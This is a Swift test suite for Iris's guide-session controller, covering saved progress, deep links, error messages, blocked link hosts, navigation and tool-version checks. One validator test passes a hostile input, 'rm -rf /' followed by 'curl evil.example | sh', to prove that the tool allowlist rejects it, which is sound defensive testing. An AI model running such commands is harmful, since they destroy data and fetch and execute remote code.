//
//  GuideSessionTests.swift
//  leanring-buddyTests
//
//  Covers `GuideSessionController` — the state layer between `GuideService` and
//  the panel. The guide API is answered by `StubbedGuideURLProtocol` rather than
//  by the network, so these exercise the real `GuideService` code path,
//  including its HTTP-status-to-error mapping, without leaving the machine.
//

import Foundation
import Testing
// The module follows PRODUCT_NAME, which the fork renamed to Iris.
@testable import Iris

// The controller is main-actor isolated, so the suite has to be too.
@MainActor
struct GuideSessionTests {

    // MARK: - Resuming and version bumps

    @Test func resumeLandsOnTheSavedStepAndSurvivesAVersionBump() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "lunara",
            requestedVersion: 2,
            branchKeyFromDeepLink: "macos:android",
            stepIndexFromDeepLink: nil
        )
        #expect(controller.loadState == .guideIsOpen)
        #expect(controller.currentStepIndex == 0)

        controller.advanceToTheNextStep()
        controller.advanceToTheNextStep()
        #expect(controller.currentStepIndex == 2)
        await controller.waitUntilProgressHasBeenPersisted()

        // Reopening the same guide at the same version puts the reader back
        // where they stopped rather than at the top.
        let controllerReopeningTheSameGuide = GuideSessionController(guideService: guideService)
        await controllerReopeningTheSameGuide.openGuide(
            slug: "lunara",
            requestedVersion: 2,
            branchKeyFromDeepLink: "macos:android",
            stepIndexFromDeepLink: nil
        )
        #expect(controllerReopeningTheSameGuide.currentStepIndex == 2)
        #expect(controllerReopeningTheSameGuide.readerHasFinishedTheGuide == false)

        // This assertion used to read the other way — a version bump started the
        // reader over — and it passed for years while being the reported bug.
        // "Step three of version two may not exist in version three" is a real
        // risk, but the version number cannot tell you whether it happened, and
        // publik bumps a version for a changed comment. So the question is asked
        // properly now: the reader's place is re-derived from the ID of the step
        // they stopped on. This guide's steps are unchanged between v2 and v3,
        // so they are put back where they were.
        //
        // `Test6ProgressDurabilityReproTests` covers the other half — a version
        // whose steps genuinely changed — which this stub cannot express,
        // because it serves identical steps for every version of a slug.
        let controllerOpeningTheNewVersion = GuideSessionController(guideService: guideService)
        await controllerOpeningTheNewVersion.openGuide(
            slug: "lunara",
            requestedVersion: 3,
            branchKeyFromDeepLink: "macos:android",
            stepIndexFromDeepLink: nil
        )
        #expect(controllerOpeningTheNewVersion.loadState == .guideIsOpen)
        #expect(controllerOpeningTheNewVersion.guideBeingFollowed?.version == 3)
        #expect(controllerOpeningTheNewVersion.currentStepIndex == 2)
        #expect(controllerOpeningTheNewVersion.stepTheReaderIsLookingAt?.id == "studio")
    }

    @Test func aLinkThatNamesAStepOverridesWhatThisMachineRemembers() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "lunara",
            requestedVersion: 2,
            branchKeyFromDeepLink: "macos:android",
            stepIndexFromDeepLink: nil
        )
        controller.advanceToTheNextStep()
        await controller.waitUntilProgressHasBeenPersisted()

        // The website knows where the reader was when they pressed the button,
        // and that is more current than anything already stored here.
        let controllerFollowingADeepLink = GuideSessionController(guideService: guideService)
        await controllerFollowingADeepLink.openGuide(
            fromDeepLink: GuideDeepLink(
                slug: "lunara",
                version: 2,
                branchKey: "macos:android",
                stepIndex: 0
            )
        )
        #expect(controllerFollowingADeepLink.currentStepIndex == 0)
    }

    // MARK: - Failures each say their own thing

    @Test func everyGuideFailureProducesItsOwnUserFacingSentence() async throws {
        var sentencesSeen: [String] = []

        for (slug, requestedVersion) in Self.slugsThatFailAndTheVersionToAskFor {
            let guideService = try Self.guideServiceAnsweredByTheStub()
            let controller = GuideSessionController(guideService: guideService)
            await controller.openGuide(
                slug: slug,
                requestedVersion: requestedVersion,
                branchKeyFromDeepLink: nil,
                stepIndexFromDeepLink: nil
            )

            guard case .guideCouldNotBeLoaded(let failedSlug, let userFacingMessage) = controller.loadState else {
                Issue.record("'\(slug)' should have failed to load")
                continue
            }
            #expect(failedSlug == slug)
            #expect(!userFacingMessage.isEmpty)
            // Nothing is left half-open behind a failure message.
            #expect(controller.guideBeingFollowed == nil)
            #expect(controller.currentStep == nil)
            #expect(controller.primaryActionForTheCurrentStep == nil)
            sentencesSeen.append(userFacingMessage)
        }

        #expect(sentencesSeen.count == Self.slugsThatFailAndTheVersionToAskFor.count)
        // "Guide version 9 is no longer available" and "Iris could not reach
        // publik" are not the same problem to the person reading them, so no
        // two failures may collapse onto the same sentence.
        #expect(Set(sentencesSeen).count == sentencesSeen.count)

        // Spot-check that the sentences are about the right thing, not just
        // different from each other.
        #expect(sentencesSeen.contains { $0.contains("has not published") })
        #expect(sentencesSeen.contains { $0.contains("not finished review") })
        #expect(sentencesSeen.contains { $0.contains("version 9") })
        #expect(sentencesSeen.contains { $0.contains("could not reach publik") })
    }

    // MARK: - Unsupported device pairs

    @Test func anUnsupportedDevicePairExplainsItselfAndOffersNoSteps() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "lunara",
            requestedVersion: 2,
            branchKeyFromDeepLink: "windows:ios",
            stepIndexFromDeepLink: nil
        )

        #expect(controller.loadState == .guideIsOpen)
        #expect(controller.selectedBranch?.branchKey == "windows:ios")

        let unsupportedPair = try #require(controller.unsupportedPairForTheSelectedBranch)
        #expect(unsupportedPair.headline == "A Windows PC cannot build an iPhone app")
        #expect(unsupportedPair.reason.contains("Xcode"))
        #expect(unsupportedPair.alternatives.count == 2)

        // A dead end must not also present steps, a step counter, or a button:
        // there is nothing here for the reader to do but pick a different pair.
        #expect(controller.currentStep == nil)
        #expect(controller.numberOfStepsInTheSelectedBranch == 0)
        #expect(controller.primaryActionForTheCurrentStep == nil)
        #expect(controller.canReturnToThePreviousStep == false)

        // The picker still offers the pairs that do work.
        #expect(controller.guideOffersAChoiceOfBranches)
        await controller.selectBranch(withBranchKey: "macos:android")
        #expect(controller.unsupportedPairForTheSelectedBranch == nil)
        #expect(controller.currentStep?.id == "clone")
    }

    // MARK: - Links Iris is not allowed to open

    @Test func aStepWhoseLinkHostIsNotAllowlistedReportsTheActionAsUnavailable() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "blocked-link",
            requestedVersion: 1,
            branchKeyFromDeepLink: nil,
            stepIndexFromDeepLink: nil
        )
        #expect(controller.loadState == .guideIsOpen)

        let primaryAction = try #require(controller.primaryActionForTheCurrentStep)
        guard case .openLinkIsUnavailable(let linkURLString, let reason) = primaryAction else {
            Issue.record("a link on an unreviewed host should report as unavailable, got \(primaryAction)")
            return
        }
        #expect(linkURLString == "https://downloads.not-reviewed.example/setup.dmg")
        // The reader has to be told which host was refused, because that is the
        // only part of the answer they can act on.
        #expect(reason.contains("downloads.not-reviewed.example"))
        // The whole point: this renders as a visibly disabled control, never as
        // a live button that quietly does nothing when pressed.
        #expect(primaryAction.isPressable == false)
        #expect(controller.openLinkInBrowser(linkURLString) == false)
        #expect(controller.readerHasTakenThisStepsAction == false)

        // Pressing the primary action anyway must not advance past the step or
        // pretend the link opened.
        controller.performPrimaryAction()
        #expect(controller.currentStepIndex == 0)
        #expect(controller.readerHasTakenThisStepsAction == false)

        // The very next step's host is allowlisted, so the same guide proves the
        // refusal is about the host and not about links in general.
        controller.advanceToTheNextStep()
        let actionForTheAllowedLink = try #require(controller.primaryActionForTheCurrentStep)
        guard case .openLinkInBrowser(_, let buttonLabel) = actionForTheAllowedLink else {
            Issue.record("an allowlisted host should be openable, got \(actionForTheAllowedLink)")
            return
        }
        #expect(buttonLabel == "Open download")
        #expect(actionForTheAllowedLink.isPressable)
    }

    // MARK: - Navigation

    @Test func stepNavigationClampsAtBothEnds() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "lunara",
            requestedVersion: 2,
            branchKeyFromDeepLink: "macos:android",
            stepIndexFromDeepLink: nil
        )
        #expect(controller.numberOfStepsInTheSelectedBranch == 3)
        #expect(controller.currentStepIndex == 0)

        // There is nothing before the first step, and a negative index would be
        // a crash rather than a wrap-around.
        controller.returnToThePreviousStep()
        controller.returnToThePreviousStep()
        #expect(controller.currentStepIndex == 0)
        #expect(controller.readerHasFinishedTheGuide == false)

        controller.advanceToTheNextStep()
        controller.advanceToTheNextStep()
        #expect(controller.currentStepIndex == 2)
        #expect(controller.stepCounterText == "3 / 3")
        #expect(controller.readerHasFinishedTheGuide == false)

        // Past the last step is the completion card, not step three of three.
        controller.advanceToTheNextStep()
        #expect(controller.readerHasFinishedTheGuide)
        #expect(controller.currentStepIndex == 2)
        #expect(controller.stepCounterText == "Done")

        controller.advanceToTheNextStep()
        controller.advanceToTheNextStep()
        #expect(controller.currentStepIndex == 2)
        #expect(controller.readerHasFinishedTheGuide)

        // Backing out of the completion card returns to the last step, which is
        // where the reader just was.
        controller.returnToThePreviousStep()
        #expect(controller.readerHasFinishedTheGuide == false)
        #expect(controller.currentStepIndex == 2)

        controller.returnToThePreviousStep()
        controller.returnToThePreviousStep()
        controller.returnToThePreviousStep()
        #expect(controller.currentStepIndex == 0)
    }

    // MARK: - Step rendering

    @Test func aCommandStepOffersCopyAndThenIRanIt() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "lunara",
            requestedVersion: 2,
            branchKeyFromDeepLink: "macos:android",
            stepIndexFromDeepLink: nil
        )

        let commandBlockText = try #require(controller.commandBlockTextForTheCurrentStep)
        #expect(commandBlockText.contains("git clone"))
        // A step with a command says where to paste it, which beats the
        // authored body at that moment.
        #expect(controller.bodyTextForTheCurrentStep == "Paste in Terminal.")

        guard case .copyCommandToClipboard(_, let labelBeforeCopying) =
                try #require(controller.primaryActionForTheCurrentStep) else {
            Issue.record("a command step should offer Copy first")
            return
        }
        #expect(labelBeforeCopying == "Copy")

        controller.copyCommandToClipboard(commandBlockText)
        #expect(controller.transientCopyConfirmationText == "Copied — paste in Terminal.")

        guard case .advanceToTheNextStep(let labelAfterCopying) =
                try #require(controller.primaryActionForTheCurrentStep) else {
            Issue.record("a copied command step should offer to move on")
            return
        }
        #expect(labelAfterCopying == "I ran it")

        // Moving on clears the confirmation, so the next step never opens with
        // the previous step's "Copied" line still showing.
        controller.advanceToTheNextStep()
        #expect(controller.transientCopyConfirmationText == nil)
        #expect(controller.readerHasTakenThisStepsAction == false)
    }

    @Test func aCheckStepListsItsToolsWithoutRunningAnythingOnArrival() async throws {
        let guideService = try Self.guideServiceAnsweredByTheStub()
        let controller = GuideSessionController(guideService: guideService)

        await controller.openGuide(
            slug: "tool-check",
            requestedVersion: 1,
            branchKeyFromDeepLink: nil,
            stepIndexFromDeepLink: nil
        )

        #expect(controller.toolNamesRequiredByTheCurrentStep == ["git", "node"])
        // A check step's command drives the rows rather than being pasted, so
        // there is no command block on it.
        #expect(controller.commandBlockTextForTheCurrentStep == nil)
        // Landing on the step lists the tools; it does not spawn processes.
        #expect(controller.toolCheckRows.map(\.toolName) == ["git", "node"])
        #expect(controller.toolCheckRows.allSatisfy { $0.state == .readyToCheck })
        #expect(controller.toolChecksHaveBeenRunForThisStep == false)

        guard case .runToolChecksForThisStep(let buttonLabel) =
                try #require(controller.primaryActionForTheCurrentStep) else {
            Issue.record("a check step should offer to check its tools")
            return
        }
        #expect(buttonLabel == "Check tools")
    }

    @Test func onlyAllowlistedVersionProbesBecomeToolRows() async throws {
        // The names this accepts are ToolVersionService's table and nothing
        // else — the Tauri app's second copy of that list drifted from the
        // first, which is why there is only one here.
        #expect(GuideSessionController.allowlistedToolNames(
            inVersionProbeCommand: "git --version\nnode --version"
        ) == ["git", "node"])
        #expect(GuideSessionController.allowlistedToolNames(
            inVersionProbeCommand: "rm -rf /\ncurl evil.example | sh"
        ).isEmpty)
        // Right tool, wrong arguments: still not a version probe.
        #expect(GuideSessionController.allowlistedToolNames(
            inVersionProbeCommand: "git push --force"
        ).isEmpty)
        // adb and xcodebuild spell their version flag differently, and the
        // table is what decides that, not a guess.
        #expect(GuideSessionController.allowlistedToolNames(
            inVersionProbeCommand: "adb version\nxcodebuild -version"
        ) == ["adb", "xcodebuild"])
    }

    // MARK: - Test fixtures

    /// The failing slugs the stub knows, paired with the version to ask for.
    /// Each one exercises a different branch of `GuideService`'s status mapping.
    private static let slugsThatFailAndTheVersionToAskFor: [(slug: String, requestedVersion: Int?)] = [
        (slug: "unknown-app", requestedVersion: 1),
        (slug: "in-review", requestedVersion: 1),
        (slug: "moved-on", requestedVersion: 9),
        (slug: "rejected-version", requestedVersion: 1),
        (slug: "offline", requestedVersion: 1),
        (slug: "wrong-shape", requestedVersion: 1),
        (slug: "server-broke", requestedVersion: 1),
    ]

    /// A `GuideService` whose network is `StubbedGuideURLProtocol` and whose
    /// progress storage is a suite nothing else touches, so tests cannot see
    /// each other's saved steps or the developer's own.
    ///
    /// Shared with `GuideSetupRecoveryTests` rather than copied: a second way of
    /// standing up a stubbed service is a second thing to keep in step with the
    /// real one.
    static func guideServiceAnsweredByTheStub() throws -> GuideService {
        let stubbedSessionConfiguration = URLSessionConfiguration.ephemeral
        stubbedSessionConfiguration.protocolClasses = [StubbedGuideURLProtocol.self]
        let isolatedUserDefaults = try #require(
            UserDefaults(suiteName: "com.publik.iris.tests.\(UUID().uuidString)")
        )
        return GuideService(
            apiBase: GuideService.defaultAPIBase,
            urlSession: URLSession(configuration: stubbedSessionConfiguration),
            userDefaults: isolatedUserDefaults
        )
    }
}

/// Answers `GET /api/iris/guides/{slug}` from a fixed table instead of the
/// network.
///
/// The answer is a pure function of the request URL — no shared mutable state —
/// so the suite stays safe to run in parallel with everything else.
final class StubbedGuideURLProtocol: URLProtocol {
    override class func canInit(with request: URLRequest) -> Bool {
        request.url?.path.hasPrefix("/api/iris/guides/") == true
    }

    override class func canonicalRequest(for request: URLRequest) -> URLRequest {
        request
    }

    override func startLoading() {
        guard let requestURL = request.url else {
            client?.urlProtocol(self, didFailWithError: URLError(.badURL))
            return
        }
        let slug = requestURL.lastPathComponent
        let requestedVersion = URLComponents(url: requestURL, resolvingAgainstBaseURL: false)?
            .queryItems?
            .first { $0.name == "version" }?
            .value
            .flatMap(Int.init)

        // "offline" is the only slug that never produces an HTTP response at
        // all — it is how a dead network is told apart from a live server that
        // said no.
        if slug == "offline" {
            client?.urlProtocol(self, didFailWithError: URLError(.notConnectedToInternet))
            return
        }

        let statusCode: Int
        let responseBody: Data
        switch slug {
        case "unknown-app":
            statusCode = 404
            responseBody = Data(#"{"error":"Guide not found."}"#.utf8)
        case "in-review":
            statusCode = 403
            responseBody = Data(#"{"error":"Guide is not published."}"#.utf8)
        case "moved-on":
            statusCode = 409
            responseBody = Data(#"{"error":"Guide version is not available."}"#.utf8)
        case "rejected-version":
            statusCode = 400
            responseBody = Data(#"{"error":"Invalid guide version."}"#.utf8)
        case "wrong-shape":
            statusCode = 200
            responseBody = Data(#"{"appSlug":"wrong-shape"}"#.utf8)
        case "server-broke":
            statusCode = 500
            responseBody = Data(#"{"error":"Internal error."}"#.utf8)
        default:
            statusCode = 200
            responseBody = Data(
                Self.guideJSON(slug: slug, version: requestedVersion ?? 2).utf8
            )
        }

        guard let httpResponse = HTTPURLResponse(
            url: requestURL,
            statusCode: statusCode,
            httpVersion: "HTTP/1.1",
            headerFields: ["Content-Type": "application/json"]
        ) else {
            client?.urlProtocol(self, didFailWithError: URLError(.badServerResponse))
            return
        }
        client?.urlProtocol(self, didReceive: httpResponse, cacheStoragePolicy: .notAllowed)
        client?.urlProtocol(self, didLoad: responseBody)
        client?.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {
        // Nothing to unwind: every answer is delivered synchronously.
    }

    /// The guides the stub serves, in the exact shape
    /// `app/api/iris/guides/[slug]/route.ts` returns.
    private static func guideJSON(slug: String, version: Int) -> String {
        switch slug {
        case "blocked-link":
            return blockedLinkGuideJSON(version: version)
        case "tool-check":
            return toolCheckGuideJSON(version: version)
        case "setup-recovery":
            return prerequisiteGuideJSON(slug: slug, version: version, carriesSetupSteps: true)
        case "no-setup-steps":
            return prerequisiteGuideJSON(slug: slug, version: version, carriesSetupSteps: false)
        default:
            return mobileGuideJSON(slug: slug, version: version)
        }
    }

    /// The shape every published desktop guide has: a branch whose `setupSteps`
    /// carry a repair for each prerequisite, and whose `steps` are the install
    /// itself. `carriesSetupSteps: false` is the same guide with that repair
    /// route removed, which is how a missing tool with nowhere to go is told
    /// apart from a missing tool the guide can fix.
    private static func prerequisiteGuideJSON(
        slug: String,
        version: Int,
        carriesSetupSteps: Bool
    ) -> String {
        let setupStepsJSON = carriesSetupSteps
            ? """
              {"id": "install-git", "kind": "terminal", "tool": "git", "title": "Install Git",
               "body": "Apple opens a small installer.", "command": "xcode-select --install",
               "verifierLabel": "Git responds with a version number"},
              {"id": "install-node", "kind": "open", "tool": "node", "title": "Install Node LTS",
               "body": "Choose the macOS Installer (.pkg).",
               "href": "https://nodejs.org/en/download", "actionLabel": "Open download",
               "verifierLabel": "Node responds with a version number"}
              """
            : ""
        return """
        {
          "appSlug": "\(slug)",
          "appName": "Prerequisite",
          "version": \(version),
          "status": "pilot",
          "sourceOwner": "Blueturboguy07",
          "sourceRepo": "\(slug)",
          "sourceCommit": null,
          "outputType": "desktop_app",
          "estimatedMinutes": 12,
          "readmeSectionIds": [],
          "branches": [
            {
              "platform": "macos",
              "target": null,
              "label": "macOS",
              "shell": "terminal",
              "setupSteps": [\(setupStepsJSON)],
              "steps": [
                {"id": "open-shell", "kind": "terminal", "title": "Open Terminal",
                 "body": "Keep it open beside Iris.", "verifierLabel": "Terminal is open"},
                {"id": "check-tools", "kind": "check", "title": "Check Git and Node",
                 "body": "Git and the current Node LTS are required.",
                 "command": "git --version\\nnode --version",
                 "verifierLabel": "Git and Node respond with version numbers"},
                {"id": "clone", "kind": "terminal", "title": "Copy it to this Mac",
                 "body": "", "command": "git clone https://github.com/Blueturboguy07/\(slug).git"},
                {"id": "run", "kind": "terminal", "title": "Run it",
                 "body": "", "command": "npm ci\\nnpm start"}
              ],
              "unsupported": null
            }
          ]
        }
        """
    }

    /// A mobile guide with the same branch shape Lunara, NoScroll, and Nut AI
    /// ship: a computer crossed with a phone, one pair of which cannot work.
    private static func mobileGuideJSON(slug: String, version: Int) -> String {
        """
        {
          "appSlug": "\(slug)",
          "appName": "Lunara",
          "version": \(version),
          "status": "pilot",
          "sourceOwner": "Blueturboguy07",
          "sourceRepo": "lunara",
          "sourceCommit": null,
          "outputType": "mobile_app",
          "estimatedMinutes": 45,
          "readmeSectionIds": [],
          "branches": [
            {
              "platform": "macos",
              "target": "android",
              "label": "Mac + Android",
              "shell": "terminal",
              "setupSteps": [],
              "steps": [
                {"id": "clone", "kind": "terminal", "title": "Copy Lunara to this Mac",
                 "body": "", "command": "cd ~\\ngit clone https://github.com/Blueturboguy07/lunara.git"},
                {"id": "install", "kind": "terminal", "title": "Install what it needs",
                 "body": "", "command": "npm ci"},
                {"id": "studio", "kind": "open", "title": "Open Android Studio",
                 "body": "Pick the folder you just cloned.",
                 "href": "https://developer.android.com/studio", "actionLabel": "Open Android Studio"}
              ],
              "unsupported": null
            },
            {
              "platform": "macos",
              "target": "ios",
              "label": "Mac + iPhone",
              "shell": "terminal",
              "setupSteps": [],
              "steps": [
                {"id": "clone", "kind": "terminal", "title": "Copy Lunara to this Mac",
                 "body": "", "command": "git clone https://github.com/Blueturboguy07/lunara.git"},
                {"id": "xcode", "kind": "open", "title": "Open Xcode",
                 "body": "Sign in with your Apple ID.",
                 "href": "https://developer.apple.com/xcode/", "actionLabel": "Open Xcode"}
              ],
              "unsupported": null
            },
            {
              "platform": "windows",
              "target": "ios",
              "label": "Windows + iPhone",
              "shell": "powershell",
              "setupSteps": [],
              "steps": [],
              "unsupported": {
                "headline": "A Windows PC cannot build an iPhone app",
                "reason": "Apple only allows iPhone apps to be built and signed on macOS using Xcode, which Apple does not release for Windows.",
                "alternatives": ["Borrow a Mac for twenty minutes", "Build the Android version instead"]
              }
            }
          ]
        }
        """
    }

    /// A desktop guide whose first step points at a host nobody reviewed, and
    /// whose second points at one that is on the allowlist.
    private static func blockedLinkGuideJSON(version: Int) -> String {
        """
        {
          "appSlug": "blocked-link",
          "appName": "Blocked Link",
          "version": \(version),
          "status": "pilot",
          "sourceOwner": "Blueturboguy07",
          "sourceRepo": "blocked-link",
          "sourceCommit": null,
          "outputType": "desktop_app",
          "estimatedMinutes": 5,
          "readmeSectionIds": [],
          "branches": [
            {
              "platform": "macos",
              "target": null,
              "label": "macOS",
              "shell": "terminal",
              "setupSteps": [],
              "steps": [
                {"id": "download", "kind": "open", "title": "Download the installer",
                 "body": "It is a small file.",
                 "href": "https://downloads.not-reviewed.example/setup.dmg", "actionLabel": "Download"},
                {"id": "install-node", "kind": "open", "title": "Install Node LTS",
                 "body": "Choose the macOS Installer.",
                 "href": "https://nodejs.org/en/download", "actionLabel": "Open download"}
              ],
              "unsupported": null
            }
          ]
        }
        """
    }

    /// A guide whose first step is a `check`, carrying its tools as version
    /// probes exactly the way the real guides author them.
    private static func toolCheckGuideJSON(version: Int) -> String {
        """
        {
          "appSlug": "tool-check",
          "appName": "Tool Check",
          "version": \(version),
          "status": "pilot",
          "sourceOwner": "Blueturboguy07",
          "sourceRepo": "tool-check",
          "sourceCommit": null,
          "outputType": "local_web",
          "estimatedMinutes": 10,
          "readmeSectionIds": [],
          "branches": [
            {
              "platform": "macos",
              "target": null,
              "label": "macOS",
              "shell": "terminal",
              "setupSteps": [],
              "steps": [
                {"id": "check-tools", "kind": "check", "title": "Check Git and Node",
                 "body": "Git and the current Node LTS are required.",
                 "command": "git --version\\nnode --version",
                 "verifierLabel": "Git and Node respond with version numbers"},
                {"id": "clone", "kind": "terminal", "title": "Copy it here",
                 "body": "", "command": "git clone https://github.com/Blueturboguy07/tool-check.git"}
              ],
              "unsupported": null
            }
          ]
        }
        """
    }
}
